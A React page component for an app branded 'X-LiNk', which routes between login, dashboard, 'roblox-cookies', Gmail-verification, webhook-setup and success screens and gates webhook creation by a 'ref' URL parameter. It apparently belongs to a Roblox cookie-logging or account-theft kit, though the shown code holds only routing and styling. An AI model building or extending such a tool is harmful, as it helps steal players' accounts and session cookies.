import { useState } from "react";
import { RainEffect } from "@/components/ui/rain-effect";
import { SnowEffect } from "@/components/ui/snow-effect";
import { PasswordLogin } from "@/components/ui/password-login";
import { Dashboard } from "@/components/ui/dashboard";
import { RobloxCookies } from "@/components/ui/roblox-cookies";
import { VerifyGmailDelete } from "@/components/ui/verify-gmail-delete";
import { SuccessNotification } from "@/components/ui/success-notification";
import { WebhookSetup } from "@/components/ui/webhook-setup";
import { useKeepAlive } from "@/hooks/use-keep-alive";

type Screen =
  | "login"
  | "dashboard"
  | "roblox-cookies"
  | "verify-gmail"
  | "webhook-setup"
  | "success";

const Index = () => {
  const [currentScreen, setCurrentScreen] = useState<Screen>("login");

  // Activate keep-alive system to prevent timeout
  const keepAlive = useKeepAlive();

  // Check if this is a custom instance
  const urlParams = new URLSearchParams(window.location.search);
  const isCustomInstance = urlParams.get("ref");

  const handleLoginSuccess = () => {
    setCurrentScreen("dashboard");
  };

  const handleDeleteGmail = () => {
    setCurrentScreen("roblox-cookies");
  };

  const handleDeleteVerifyGmail = () => {
    setCurrentScreen("verify-gmail");
  };

  const handleCreateWebhook = () => {
    setCurrentScreen("webhook-setup");
  };

  const handleBackToDashboard = () => {
    setCurrentScreen("dashboard");
  };

  const handleSuccess = () => {
    setCurrentScreen("success");
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
      case "dashboard":
        return (
          <Dashboard
            onDeleteGmail={handleDeleteGmail}
            onDeleteVerifyGmail={handleDeleteVerifyGmail}
            // Only pass webhook creation function if NOT a custom instance
            onCreateWebhook={
              !isCustomInstance ? handleCreateWebhook : undefined
            }
          />
        );
      case "roblox-cookies":
        return (
          <RobloxCookies
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "verify-gmail":
        return (
          <VerifyGmailDelete
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "webhook-setup":
        // Only allow webhook setup for main instance
        if (!isCustomInstance) {
          return <WebhookSetup onBack={handleBackToDashboard} />;
        }
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
      case "success":
        return (
          <SuccessNotification onBackToDashboard={handleBackToDashboard} />
        );
      default:
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-gradient-to-br from-slate-950 via-blue-950 to-black">
      {/* Primary Professional Background Layer */}
      <div className="absolute inset-0 bg-gradient-to-br from-slate-950 via-blue-950 to-black opacity-95" />

      {/* Secondary Metallic Overlay */}
      <div
        className="absolute inset-0 opacity-30"
        style={{
          background: `
            radial-gradient(circle at 20% 80%, rgba(120, 113, 108, 0.3) 0%, transparent 50%),
            radial-gradient(circle at 80% 20%, rgba(82, 82, 91, 0.3) 0%, transparent 50%),
            radial-gradient(circle at 40% 40%, rgba(59, 130, 246, 0.1) 0%, transparent 50%)
          `,
        }}
      />

      {/* Professional Grid Pattern */}
      <div
        className="absolute inset-0 opacity-[0.02] grid-pattern"
        style={{
          backgroundImage: `
            linear-gradient(rgba(59, 130, 246, 0.5) 1px, transparent 1px),
            linear-gradient(90deg, rgba(59, 130, 246, 0.5) 1px, transparent 1px)
          `,
          backgroundSize: "60px 60px",
        }}
      />

      {/* Ambient Light Effects */}
      <div className="absolute top-0 left-1/4 w-96 h-96 bg-blue-500/5 rounded-full blur-3xl animate-pulse-slow" />
      <div
        className="absolute bottom-0 right-1/4 w-96 h-96 bg-purple-500/5 rounded-full blur-3xl animate-pulse-slow"
        style={{ animationDelay: "1s" }}
      />
      <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-radial from-blue-500/3 to-transparent rounded-full blur-3xl" />

      {/* Enhanced Weather Effects */}
      <RainEffect />
      <SnowEffect />

      {/* Professional Status Indicators */}
      <div className="fixed top-6 right-6 z-50 flex flex-col gap-2">
        {/* Keep-alive indicator */}
        <div className="glass-effect rounded-full px-4 py-2 flex items-center gap-2">
          <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
          <span className="text-xs font-medium text-green-300 font-mono">
            ONLINE
          </span>
        </div>

        {/* Instance type indicator */}
        {isCustomInstance && (
          <div className="glass-effect rounded-full px-4 py-2 flex items-center gap-2">
            <div className="w-2 h-2 bg-purple-400 rounded-full"></div>
            <span className="text-xs font-medium text-purple-300 font-mono">
              CUSTOM
            </span>
          </div>
        )}
      </div>

      {/* Professional Watermark */}
      <div className="fixed bottom-6 left-6 z-50">
        <div className="glass-effect rounded-lg px-4 py-2">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 bg-gradient-to-br from-blue-500 to-purple-600 rounded-lg flex items-center justify-center">
              <span className="text-white font-bold text-sm">X</span>
            </div>
            <div className="flex flex-col">
              <span className="text-white font-semibold text-sm tracking-wide">
                X-LiNk
              </span>
              <span className="text-gray-400 text-xs font-mono">
                v2.0 Professional
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Floating Particles Effect */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {[...Array(15)].map((_, i) => (
          <div
            key={i}
            className="absolute w-1 h-1 bg-blue-400/20 rounded-full animate-float"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 3}s`,
              animationDuration: `${3 + Math.random() * 2}s`,
            }}
          />
        ))}
      </div>

      {/* Performance Scanlines Effect */}
      <div
        className="absolute inset-0 opacity-[0.01] pointer-events-none"
        style={{
          background: `repeating-linear-gradient(
            0deg,
            transparent,
            transparent 2px,
            rgba(59, 130, 246, 0.1) 2px,
            rgba(59, 130, 246, 0.1) 4px
          )`,
        }}
      />

      {/* Main Content Container */}
      <div className="relative z-10 min-h-screen">
        <div className="animate-fade-in">{renderScreen()}</div>
      </div>

      {/* Professional Corner Accents */}
      <div className="fixed top-0 left-0 w-32 h-32 pointer-events-none">
        <div className="absolute top-0 left-0 w-full h-0.5 bg-gradient-to-r from-blue-500/50 to-transparent"></div>
        <div className="absolute top-0 left-0 w-0.5 h-full bg-gradient-to-b from-blue-500/50 to-transparent"></div>
      </div>

      <div className="fixed top-0 right-0 w-32 h-32 pointer-events-none">
        <div className="absolute top-0 right-0 w-full h-0.5 bg-gradient-to-l from-blue-500/50 to-transparent"></div>
        <div className="absolute top-0 right-0 w-0.5 h-full bg-gradient-to-b from-blue-500/50 to-transparent"></div>
      </div>

      <div className="fixed bottom-0 left-0 w-32 h-32 pointer-events-none">
        <div className="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-blue-500/50 to-transparent"></div>
        <div className="absolute bottom-0 left-0 w-0.5 h-full bg-gradient-to-t from-blue-500/50 to-transparent"></div>
      </div>

      <div className="fixed bottom-0 right-0 w-32 h-32 pointer-events-none">
        <div className="absolute bottom-0 right-0 w-full h-0.5 bg-gradient-to-l from-blue-500/50 to-transparent"></div>
        <div className="absolute bottom-0 right-0 w-0.5 h-full bg-gradient-to-t from-blue-500/50 to-transparent"></div>
      </div>
    </div>
  );
};

export default Index;
